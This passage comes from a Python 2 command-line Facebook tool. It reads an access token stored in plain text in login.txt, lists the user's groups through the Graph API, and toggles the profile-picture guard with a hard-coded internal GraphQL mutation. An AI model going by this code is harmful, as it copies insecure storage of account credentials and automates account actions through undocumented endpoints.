        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 52 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Group \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Enable'
    print '║-> \x1b[1;37;40m2. Disable'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    g = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                lain()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()
